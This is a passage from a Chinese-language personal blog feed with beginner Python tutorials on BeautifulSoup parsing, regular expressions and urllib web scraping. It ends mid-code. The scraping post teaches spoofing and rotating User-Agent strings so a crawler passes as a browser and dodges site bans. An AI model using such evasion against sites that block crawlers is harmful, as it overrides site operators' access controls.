    <content type="html"><![CDATA[<h2 id="BeautifulSoup学习"><a href="#BeautifulSoup学习" class="headerlink" title="BeautifulSoup学习"></a>BeautifulSoup学习</h2><ol><li><p>安装：</p><blockquote><p>pip install bs4</p><p>pip install lxml</p></blockquote></li><li><p>使用</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="section"># 对象实例化</span></span><br><span class="line"><span class="code"># 1.加载本地html文件</span></span><br><span class="line"><span class="code">    fp = open(&quot;./xxx.html&quot;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="code">    soup = BeautifulSoup(fp, &#x27;lxml&#x27;)</span></span><br><span class="line"><span class="code">    # 2.将获取到的页面加载到对象</span></span><br><span class="line"><span class="code">    page_text = response.text</span></span><br><span class="line"><span class="code">    soup = BeautifulSoup(page_text, &#x27;lxml&#x27;)</span></span><br><span class="line"><span class="code"># 用于数据解析的方法和属性</span></span><br><span class="line"><span class="code">- soup.tagName: 返回文档中第一次出现的tagName标签</span></span><br><span class="line"><span class="code">- soup.find():</span></span><br><span class="line"><span class="code">- find(&#x27;tagName&#x27;): 等同于soup.tagName</span></span><br><span class="line"><span class="code">- 属性定位: soup.find(&#x27;div&#x27;, class_/id/attr = &quot;value&quot;)</span></span><br><span class="line"><span class="code">- soup.find_all(&quot;tagName&quot;):返回所有标签(列表)</span></span><br><span class="line"><span class="code">- select:</span></span><br><span class="line"><span class="code">- soup.select(&quot;某种选择器(id, class, 标签...选择器)&quot;)： 返回一个列表</span></span><br><span class="line"><span class="code">- 层级选择：</span></span><br><span class="line"><span class="code">soup.select(&quot;.tang &gt; ul &gt; li &gt; a&quot;): &gt; 表示一个层级</span></span><br><span class="line"><span class="code">soup.select(&quot;.tang &gt; ul a&quot;): 空格表示多个层级</span></span><br><span class="line"><span class="code"> - 获取标签之间的文本数据:</span></span><br><span class="line"><span class="code">  - soup.a.text/string/get_text()</span></span><br><span class="line"><span class="code">  - text/get_text(): 可以获取某一个标签中的所有的文本内容</span></span><br><span class="line"><span class="code">  - string：只能获取标签下直系的内容</span></span><br><span class="line"><span class="code"> - 获取标签中的属性值:</span></span><br><span class="line"><span class="code">  - soup.a[&#x27;href&#x27;]</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code">    </span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BeautifulSoup学习&quot;&gt;&lt;a href=&quot;#BeautifulSoup学习&quot; class=&quot;headerlink&quot; title=&quot;BeautifulSoup学习&quot;&gt;&lt;/a&gt;BeautifulSoup学习&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="爬虫" scheme="https://1xueyu1.github.io/categories/python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://1xueyu1.github.io/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>https://1xueyu1.github.io/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2024-02-07T09:45:37.000Z</published>
    <updated>2024-02-07T11:44:11.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python使用"><a href="#python使用" class="headerlink" title="python使用"></a>python使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">苹果是红色的</span></span><br><span class="line"><span class="string">橙子是橙色的</span></span><br><span class="line"><span class="string">香蕉是黄色的</span></span><br><span class="line"><span class="string">乌鸦是黑色的</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># r表示原始字符串， 不对字符串中的符号进行转义</span></span><br><span class="line">p = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.色&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> p.findall(content):</span><br><span class="line">    <span class="built_in">print</span>(one)</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20240207175308040.png" alt="image-20240207175308040"></p><h2 id="符号含义"><a href="#符号含义" class="headerlink" title="符号含义"></a>符号含义</h2><ol><li><p><code>.</code>表示匹配除<code>\n</code>外的任何<strong>单个</strong>字符</p><p>·eg: <code>.色</code>可以匹配<code>黄色</code>, <code>绿色</code>等两个字符的</p></li><li><p><code>*</code>匹配前面的子表达式任意次，包括0</p><p>·eg:<code>,.*</code>匹配逗号后面的任意字符串</p><p><img src="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20240207193324690.png" alt="image-20240207193324690"></p><p><img src="/2024/02/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20240207193520269.png" alt="image-20240207193520269"></p></li><li><p><code>+</code>,和<code>*</code>类似，但是不包括0</p></li><li><p><code>&#123;&#125;</code>指定匹配次数</p><p>eg: 有{3， 4}匹配连续的 <strong>有</strong> 字，至少3次，至多4次</p></li></ol><h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><h3 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h3><p>src &#x3D; <code>‘&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;’</code></p><p>使用<code>&lt;.*&gt;</code>匹配到的结果是<code>‘&lt;html&gt;&lt;head&gt;&lt;title&gt;Title&lt;/title&gt;’</code></p><h3 id="非贪婪模式"><a href="#非贪婪模式" class="headerlink" title="非贪婪模式"></a>非贪婪模式</h3><p>使用<code>&lt;.*?&gt;</code>匹配到的结果是<code>[&#39;&lt;html&gt;&#39;, &#39;&lt;head&gt;&#39;, &#39;&lt;title&gt;&#39;, &#39;&lt;/title&gt;&#39;]</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;python使用&quot;&gt;&lt;a href=&quot;#python使用&quot; class=&quot;headerlink&quot; title=&quot;python使用&quot;&gt;&lt;/a&gt;python使用&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="正则表达式" scheme="https://1xueyu1.github.io/categories/python/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>爬虫入门</title>
    <link href="https://1xueyu1.github.io/2024/01/27/%E7%88%AC%E8%99%AB/"/>
    <id>https://1xueyu1.github.io/2024/01/27/%E7%88%AC%E8%99%AB/</id>
    <published>2024-01-27T12:59:48.000Z</published>
    <updated>2024-02-06T14:05:02.743Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://c.biancheng.net/python_spider/useragent-pool.html">构建User-Agnet代理池 (biancheng.net)</a></p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="获取网页html信息"><a href="#获取网页html信息" class="headerlink" title="获取网页html信息"></a>获取网页html信息</h2><h3 id="1-获取响应对象"><a href="#1-获取响应对象" class="headerlink" title="1) 获取响应对象"></a>1) 获取响应对象</h3><p>向百度（<a href="http://www.baidu.com/%EF%BC%89%E5%8F%91%E8%B5%B7%E8%AF%B7%E6%B1%82%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%99%BE%E5%BA%A6%E9%A6%96%E9%A1%B5%E7%9A%84">http://www.baidu.com/）发起请求，获取百度首页的</a> HTML 信息，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#导包,发起请求使用urllib库的request请求模块</span><br><span class="line">import urllib.request</span><br><span class="line"># urlopen()向URL发请求,返回响应对象,注意url必须完整response=urllib.request.urlopen(&#x27;http://www.baidu.com/&#x27;)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p>上述代码会返回百度首页的响应对象， 其中 urlopen() 表示打开一个网页地址。注意：请求的 url 必须带有 http 或者 https 传输协议。</p><p>输出结果，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;http.client.HTTPResponse object at 0x00000237E872EC20&gt;</span><br></pre></td></tr></table></figure><h3 id="2-输出HTML信息"><a href="#2-输出HTML信息" class="headerlink" title="2) 输出HTML信息"></a>2) 输出HTML信息</h3><p>在上述代码的基础上继续编写如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#提取响应内容</span><br><span class="line">html = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">#打印响应内容</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><p>在本节您认识了第一个爬虫库 urllib，下面关于 urllib 做简单总结。</p><h3 id="1-urlopen"><a href="#1-urlopen" class="headerlink" title="1) urlopen()"></a>1) urlopen()</h3><p>表示向网站发起请求并获取响应对象，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.urlopen(url,timeout)</span><br></pre></td></tr></table></figure><p>urlopen() 有两个参数，说明如下：</p><ul><li>url：表示要爬取数据的 url 地址。</li><li>timeout：设置等待超时时间，指定时间内未得到响应则抛出超时异常。</li></ul><h3 id="2-Request"><a href="#2-Request" class="headerlink" title="2) Request()"></a>2) Request()</h3><p>该方法用于创建请求对象、包装请求头，比如重构 User-Agent（即用户代理，指用户使用的浏览器）使程序更像人类的请求，而非机器。重构 User-Agent 是爬虫和反爬虫斗争的第一步。在下一节会做详细介绍。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.Request(url,headers)</span><br></pre></td></tr></table></figure><p>参数说明如下：</p><ul><li>url：请求的URL地址。</li><li>headers：重构请求头。</li></ul><h3 id="3-html响应对象方法"><a href="#3-html响应对象方法" class="headerlink" title="3) html响应对象方法"></a>3) html响应对象方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bytes = response.read() # read()返回结果为 bytes 数据类型</span><br><span class="line">string = response.read().decode() # decode()将字节串转换为 string 类型</span><br><span class="line">url = response.geturl() # 返回响应对象的URL地址</span><br><span class="line">code = response.getcode() # 返回请求时的HTTP响应码</span><br></pre></td></tr></table></figure><h3 id="4-编码解码操作"><a href="#4-编码解码操作" class="headerlink" title="4) 编码解码操作"></a>4) 编码解码操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#字符串转换为字节码</span><br><span class="line">string.encode(&quot;utf-8&quot;) </span><br><span class="line">#字节码转换为字符串</span><br><span class="line">bytes.decode(&quot;utf-8&quot;) </span><br></pre></td></tr></table></figure><h2 id="User-Agent（用户代理）是什么"><a href="#User-Agent（用户代理）是什么" class="headerlink" title="User-Agent（用户代理）是什么"></a>User-Agent（用户代理）是什么</h2><p>网站通过识别请求头中 User-Agent 信息来判断是否是爬虫访问网站。如果是，网站首先对该 IP 进行预警，对其进行重点监控，当发现该 IP 超过规定时间内的访问次数， 将在一段时间内禁止其再次访问网站。</p><h3 id="爬虫程序UA信息"><a href="#爬虫程序UA信息" class="headerlink" title="爬虫程序UA信息"></a>爬虫程序UA信息</h3><p>下面，通过向 HTTP 测试网站（<a href="http://httpbin.org/%EF%BC%89%E5%8F%91%E9%80%81">http://httpbin.org/）发送</a> GET 请求来查看请求头信息，从而获取爬虫程序的 UA。代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#导入模块import urllib.request#向网站发送get请求response=urllib.request.urlopen(&#x27;http://httpbin.org/get&#x27;)html = response.read().decode()print(html)</span><br></pre></td></tr></table></figure><p>程序运行后，输出的请求头信息如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Python-urllib/3.10&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root=1-65b50128-7255dfdc546e1ead1ac95545&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;18.179.50.136&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http://httpbin.org/get&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从输出结果可以看出，User-Agent 竟然是 Python-urllib&#x2F;3.10，这显然是爬虫程序访问网站。因此就需要重构 User-Agent，将其伪装成“浏览器”访问网站。</p><h3 id="重构爬虫UA信息"><a href="#重构爬虫UA信息" class="headerlink" title="重构爬虫UA信息"></a>重构爬虫UA信息</h3><p>下面使用<code>urllib.request.Request()</code>方法重构 User-Agent 信息，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#导包,发起请求使用urllib库的request请求模块</span><br><span class="line">from urllib import request</span><br><span class="line"></span><br><span class="line">url = &#x27;http://httpbin.org/get&#x27;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27; : &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763&#x27;</span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(url=url,headers=headers)</span><br><span class="line">res = request.urlopen(req)</span><br><span class="line">html = res.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure><p>程序的运行结果，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;&#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;identity&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root=1-65b502da-15454e9b21a63a0272dec77b&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;18.179.50.136&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http://httpbin.org/get&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构建User-Agnet代理池"><a href="#构建User-Agnet代理池" class="headerlink" title="构建User-Agnet代理池"></a>构建User-Agnet代理池</h2><p>在编写爬虫程序时，一般都会构建一个 User-Agent （用户代理）池，就是把多个浏览器的 UA 信息放进列表中，然后再从中随机选择。构建用户代理池，能够避免总是使用一个 UA 来访问网站，因为短时间内总使用一个 UA 高频率访问的网站，可能会引起网站的警觉，从而封杀掉 IP。</p><h3 id="自定义UA代理池"><a href="#自定义UA代理池" class="headerlink" title="自定义UA代理池"></a>自定义UA代理池</h3><p>构建代理池的方法也非常简单，在您的 Pycharm 工作目录中定义一个 ua_info.py 文件，并将以下 UA 信息以列表的形式粘贴到该文件中，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ua_list = [</span><br><span class="line">    &#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon 2.0&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&#x27;,</span><br><span class="line">    &#x27;User-Agent:Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;,</span><br><span class="line">    &#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50&#x27;,</span><br><span class="line">    &#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0&#x27;,</span><br><span class="line">    &#x27; Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1&#x27;,</span><br><span class="line">    &#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1&#x27;,</span><br><span class="line">    &#x27; Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1&#x27;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>经过上述操作，用户代理池就构建成功。</p><h3 id="模块随机获取UA"><a href="#模块随机获取UA" class="headerlink" title="模块随机获取UA"></a>模块随机获取UA</h3><p>您也可以使用专门第三方的模块来随机获取浏览器 UA 信息，不过该模块需要单独安装，安装方式如下：</p><p>pip install fake-useragent</p><p>下载安装成功后，演示如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from fake_useragent import UserAgent</span><br><span class="line">ua = UserAgent()</span><br><span class="line">print(ua.edge)</span><br><span class="line">print(ua.chrome)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36</span><br></pre></td></tr></table></figure><h2 id="URL基本组成"><a href="#URL基本组成" class="headerlink" title="URL基本组成"></a>URL基本组成</h2><p>URL 是由一些简单的组件构成，比如协议、域名、端口号、路径和查询字符串等，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.biancheng.net/index?param=10</span><br></pre></td></tr></table></figure><p>路径和查询字符串之间使用问号<code>?</code>隔开。上述示例的域名为 <a href="http://www.biancheng.net,路径为/">www.biancheng.net，路径为</a> index，查询字符串为 param&#x3D;1。</p><p>URL 中规定了一些具有特殊意义的字符，常被用来分隔两个不同的 URL 组件，这些字符被称为<strong>保留字符</strong>。例如：</p><ul><li>冒号：用于分隔协议和主机组件，斜杠用于分隔主机和路径</li><li><code>?</code>：用于分隔路径和查询参数等。</li><li><code>=</code>用于表示查询参数中的键值对。</li><li><code>&amp;</code>符号用于分隔查询多个键值对。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其余常用的保留字符有：/ . ... # @ $ + ; %</span><br></pre></td></tr></table></figure><h3 id="Python实现编码与解码"><a href="#Python实现编码与解码" class="headerlink" title="Python实现编码与解码"></a>Python实现编码与解码</h3><p>Python 的标准库<code>urllib.parse</code>模块中提供了用来编码和解码的方法，分别是 urlencode() 与 unquote() 方法。</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>urlencode()</td><td>该方法实现了对 url 地址的编码操作</td></tr><tr><td>unquote()</td><td>该方法将编码后的 url 地址进行还原，被称为解码</td></tr></tbody></table><h4 id="1-编码urlencode"><a href="#1-编码urlencode" class="headerlink" title="1) 编码urlencode()"></a>1) 编码urlencode()</h4><p>下面以百度搜索为例进行讲解。首先打开百度首页，在搜索框中输入“爬虫”，然后点击“百度一下”。当搜索结果显示后，此时地址栏的 URL 信息，如下所示：</p><blockquote><p><a href="https://www.baidu.com/s?wd=%E7%88%AC%E8%99%AB&rsv_spt=1&rsv_iqid=0xa3ca348c0001a2ab&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&tn=baiduhome_pg&rsv_enter=1&rsv_dl=ib&rsv_sug3=8&rsv_sug1=7&rsv_sug7=101">https://www.baidu.com/s?wd=爬虫&amp;rsv_spt=1&amp;rsv_iqid=0xa3ca348c0001a2ab&amp;issp=1&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_dl=ib&amp;rsv_sug3=8&amp;rsv_sug1=7&amp;rsv_sug7=101</a></p></blockquote><p>可以看出 URL 中有很多的查询字符串，而第一个查询字符串就是“wd&#x3D;爬虫”，其中 wd 表示查询字符串的键，而“爬虫”则代表您输入的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">query_string = &#123;</span><br><span class="line">    &#x27;wd&#x27; : &#x27;爬虫&#x27;</span><br><span class="line">&#125;</span><br><span class="line"># 编码</span><br><span class="line">result = parse.urlencode(query_string)</span><br><span class="line"># 使用format函数拼接url地址</span><br><span class="line">url = &#x27;http://www.baidu.com/s?&#123;&#125;&#x27;.format(result)</span><br><span class="line">print(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com/s?wd=%E7%88%AC%E8%99%AB</span><br></pre></td></tr></table></figure><h4 id="2-解码unquote-string"><a href="#2-解码unquote-string" class="headerlink" title="2) 解码unquote(string)"></a>2) 解码unquote(string)</h4><p>解码是对编码后的 URL 进行还原的一种操作，示例代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">string = &#x27;%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">result = parse.unquote(string)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>输出结果：</p><blockquote><p>爬虫</p></blockquote><h4 id="3-URL地址拼接方式"><a href="#3-URL地址拼接方式" class="headerlink" title="3) URL地址拼接方式"></a>3) URL地址拼接方式</h4><p>最后，给大家介绍三种拼接 URL 地址的方法。除了使用 format() 函数外，还可以使用字符串相加，以及字符串占位符，总结如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 1、字符串相加</span><br><span class="line">  baseurl = &#x27;http://www.baidu.com/s?&#x27;</span><br><span class="line">  params=&#x27;wd=%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">  url = baseurl + params</span><br><span class="line"># 2、字符串格式化（占位符）</span><br><span class="line">  params=&#x27;wd=%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">  url = &#x27;http://www.baidu.com/s?%s&#x27;% params</span><br><span class="line"># 3、format()方法</span><br><span class="line">  url = &#x27;http://www.baidu.com/s?&#123;&#125;&#x27;</span><br><span class="line">  params=&#x27;wd=%E7%88%AC%E8%99%AB&#x27;</span><br><span class="line">  url = url.format(params)</span><br></pre></td></tr></table></figure><h2 id="Python爬虫抓取网页"><a href="#Python爬虫抓取网页" class="headerlink" title="Python爬虫抓取网页"></a>Python爬虫抓取网页</h2><p>首先我们对要编写的爬虫程序进行简单地分析，该程序可分为以下三个部分：</p><ul><li>拼接 url 地址</li><li>发送请求</li><li>将照片保存至本地</li></ul><h3 id="导入所需模块"><a href="#导入所需模块" class="headerlink" title="导入所需模块"></a>导入所需模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">from urllib import request</span><br><span class="line">from fake_useragent import UserAgent</span><br></pre></td></tr></table></figure><h3 id="拼接URL地址"><a href="#拼接URL地址" class="headerlink" title="拼接URL地址"></a>拼接URL地址</h3><p>定义 URL 变量，拼接 url 地址。代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一、 拼接 URL 地址</span></span><br><span class="line">query_string = &#123;</span><br><span class="line">    <span class="string">&#x27;wd&#x27;</span> : <span class="string">&#x27;杀戮天使&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line">result = parse.urlencode(query_string)</span><br><span class="line"><span class="comment"># 使用format函数拼接url地址</span></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/s?&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(result)</span><br></pre></td></tr></table></figure><h3 id="向URL发送请求"><a href="#向URL发送请求" class="headerlink" title="向URL发送请求"></a>向URL发送请求</h3><p>发送请求主要分为以下几个步骤：</p><ul><li>创建请求对象-Request</li><li>获取响应对象-urlopen</li><li>获取响应内容-read</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 二、 向 URL 发送请求</span></span><br><span class="line"><span class="comment"># 1. 重构请求头</span></span><br><span class="line">ua = UserAgent()</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span> : 